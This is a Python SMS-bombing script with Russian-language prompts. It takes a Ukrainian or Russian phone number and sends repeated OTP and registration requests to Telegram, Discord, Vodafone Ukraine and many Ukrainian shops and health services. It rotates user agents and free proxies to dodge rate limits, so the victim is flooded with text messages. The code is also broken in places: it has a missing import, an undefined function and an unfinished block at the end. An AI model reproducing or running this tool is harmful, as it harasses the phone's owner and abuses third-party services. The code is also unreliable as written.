# Version 1.0
import requests
import fake_useragent
import time
import os
import threading
from threading import Thread
from rich.console import Console
from rich.progress import *

console = Console()

os.system('cls' if os.name == 'nt' else 'clear')


def generate_info():
    global _name
    global _email
    global password
    global username
    global junker_phone
    _name = ''
    password = ''
    username = ''
    for x in range(12):
        _name = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = _name + random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
    _email = _name + '@gmail.com'
    email = _email

def generate_proxy():
    proxy = requests.get("https://gimmeproxy.com/api/getProxy?curl=true&protocol=http&supportsHttps=true").text
    console.print(proxy)
    return {"http": proxy, "https": proxy}
    main()

console.print('''[bold green]                                                                                          
  ___   _ __     __ _   _ __ ___  
 / __| | '_ \   / _` | | '_ ` _ \ 
 \__ \ | |_) | | (_| | | | | | | |
 |___/ | .__/   \__,_| |_| |_| |_|
       |_|                                                                         
''')
console.print('''[bold red]
 -----------------------------------------        
| Telegram - @Hironotori                  |
 -----------------------------------------
''')

conut = console.input('[cyan]Выберите вашу страну:\n[red][1] - Украина\n[2] - Россия\n[blue]spammer>> ')

console.print("[purple]Введите номер телефонa (без +): ")

number = console.input("[blue]spammer>> ")

proxy = console.input("[yellow]Использовать прокси? (y/n):\n[blue]spammer>> ")
if proxy.lower() == "y":
        proxies = generate_proxy()
else:
        proxies = None

run = int(console.input('[green]Введите количество повторов (1-10):\n[blue]spammer>> '))

def ukr():
        for _ in track(range(run)):
                headers = {"User-Agent": fake_useragent.UserAgent().random}
                try:
                        requests.post("https://my.telegram.org/auth/send_password", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://discord.com/api/v9/auth/register/phone", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://registration.vodafone.ua/api/v1/process/smsCode", json={"number": number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://megasport.ua/api/auth/phone/?language=ua", json={"phone": "+" + number}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://zolotakoroleva.ua/api/send-otp", json={"params": {"phone": "+" + number}}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://mozayka.com.ua/!processing/ajax.php", data={"phone": "+" + number, "mp_m": "sendsmscodereg", "token": "9d064a2beeb932ae5de11f74631269b4"}, headers=headers, proxies=proxies)
                except:
                        pass
                try:
                        requests.post("https://my.xtra.tv/api/signup?lang=uk ", data={"phone": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://auth.multiplex.ua/login", json={"login": "+" + number}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://helsi.me/api/healthy/v2/accounts/login", json={"phone": number, "platform": "PISWeb"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://ukrzoloto.ua/api/login", json={"data": {"telephoneNumber": number}}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://prosto.tv/wp-admin/admin-ajax.php", data={"action": "check-phone", "phone": "+" + number, "username": "TGHIronotori", "_nonce": "db4f28b9da"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://bi.ua/api/v1/accounts", json={"grand_type": "sms_code", "login": "сергей", "phone": number, "stage": "1"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+###+##+###+##+##")
                        requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        formatted_phone = format_phone(number, "+###+##+###+##+##")
                        requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": " eyJpdiI6ImFEZlI2RlNEb2ZZSWM1NWVBYmgyRUE9PSIsInZhbHVlIjoiWHNSa21RS1gwVEV2Q3M0OSt6QjY0MWphcXNUSVdLQkNwazlFa3ZzYllJUW9LWXF2T3VOUXJuUjhTMStoRFB1RyIsIm1hYyI6ImE1ZTJkNzJmNjk2NWJlMjc0OGFlN2Y1MGU5MjE3NWU1MzM0Njc1MmUzNGFmZDBhZDBlMjAxOWE0MGY3NTVjYzUifQ", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": "bXjwBMo8eSTiyWpex3QEOqwblgWabMYTPK2uyZ7m", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:
                        requests.post("https://kumo.com.ua/registration/sms/", data={"phone": "+" + number, "_token": " eyJpdiI6ImFEZlI2RlNEb2ZZSWM1NWVBYmgyRUE9PSIsInZhbHVlIjoiWHNSa21RS1gwVEV2Q3M0OSt6QjY0MWphcXNUSVdLQkNwazlFa3ZzYllJUW9LWXF2T3VOUXJuUjhTMStoRFB1RyIsIm1hYyI6ImE1ZTJkNzJmNjk2NWJlMjc0OGFlN2Y1MGU5MjE3NWU1MzM0Njc1MmUzNGFmZDBhZDBlMjAxOWE0MGY3NTVjYzUifQ", "g-recaptcha-response": "1"}, headers=headers, proxies=proxies)
                        pass
                except:
                        pass
                try:


if conut =='1'
        ukr()
